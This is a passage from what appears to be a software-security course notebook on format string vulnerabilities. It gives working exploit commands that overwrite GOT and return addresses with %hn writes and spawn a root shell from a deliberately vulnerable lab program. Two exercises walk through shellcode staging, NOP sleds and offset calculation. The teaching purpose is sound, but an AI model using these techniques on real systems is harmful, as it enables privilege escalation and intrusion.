   "metadata": {},
   "outputs": [],
   "source": [
    "# find the address of exit in GOT to write to\n",
    "! objdump -R ./fmt_vuln.exe | grep exit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- modify the string to write to the address of exit function\n",
    "- run the final exploit code on Terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x10\\xc0\\x04\\x08\\x12\\xc0\\x04\\x08\")%46404x%29\\$hn%19023x%30\\$hn\n",
    "\n",
    "...\n",
    "\n",
    "[*] test_val @ 0x0804c01c = -72 0xffffffb8\n",
    "[*] text is @ 0xffffb5b0\n",
    "# whoami                                                                                                       \n",
    "root\n",
    "# ls                                                                                                           \n",
    "Makefile        exploit_fmt.bin  fmt_vuln.exe  getenvaddr.cpp  shellcode_root.bin\n",
    "directpara.exe  fmt_vuln.cpp     fmt_vuln.o    getenvaddr.exe\n",
    "#    \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 1\n",
    "- stash your shellcode in shell environment and exploit the `format string` vulnerability in `labs/format_string/fmt_string.cpp` to execute the shellcode by modifying the return address to the address of shellcode in environment variable.\n",
    "\n",
    "### steps:\n",
    "- stash your shellcode in shell environment\n",
    "- find the address of shellcode using getenvaddr program\n",
    "- find the nth parameter that'll crash program\n",
    "\n",
    "```bash\n",
    "$ python -c 'print(\"AAAA%x%x%x%x%x%x%x\")' | ./fmt_vuln2.exe \n",
    "$ python -c 'print(\"AAAA%x%x%x%x%x%x%7\\$x\")' | ./fmt_vuln2.exe\n",
    "$ python -c 'print(\"<return address>%7\\$n\")' | ./fmt_vuln2.exe\n",
    "$ python -c 'print(\"<8-byte return address>%widthx%7\\$hn%widthx%8\\$hn\")' | ./fmt_vuln2.exe\n",
    "```\n",
    "- doing some math, update the return address using half-write with shellcode address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 2\n",
    "- Smuggle your `shellcode` as a part of data into the program and exploit the `format string` vulnerability in `labs/format_string/fmt_string.cpp` program found in this repo by modifying the return address to point to the exploit code.\n",
    "\n",
    "### steps\n",
    "- compile and make `labs/format_string/fmt_string.cpp` program a privileged program\n",
    "- run the program to note the return address and the address of input buffer\n",
    "- create an exploit file with 12 (nop sled) + 24 (shellcode) = 36 bytes it makes it easier if the total bytes is multiple of 4\n",
    "```bash\n",
    "$ python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*12)' > fmt_vuln2exploit.bin\n",
    "$ cat shellcode.bin >> fmt_vuln2exploit.bin\n",
    "$ wc -c fmt_vuln2exploit.bin\n",
    "```\n",
    "- find out the right parameter number that starts repeating AAAA in hex\n",
    "```bash\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf \"AAAA\")%1\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf \"AAAA\")%2\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf \"AAAA\")%15\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf \"AAAA\")%15\\$x\n",
    "```\n",
    "\n",
    "- now find the width parameter to write the address of input buffer at the return address: let's say:\n",
    "    - input is @ 0xffffc2e8\n",
    "    - return address @ 0xffffc3bc\n",
    " \n",
    "- find the width for the least 2 significant bytes\n",
    "\n",
    "```bash\n",
    "$ printf \"%d\" $((0xc2e8-36-8)) # 36 bytes is exploit code; that is printed as well. => 49852\n",
    "$ printf \"%d\" $((0xffff-0xc2f8)) # -> 15639\n",
    "```\n",
    "- final exploit will look something like this...\n",
    "\n",
    "```bash\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf \"\\xbc\\xc3\\xff\\xff\\xbe\\xc3\\xff\\xff\")%49852x%15\\$hn%15639x%16\\$hn\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
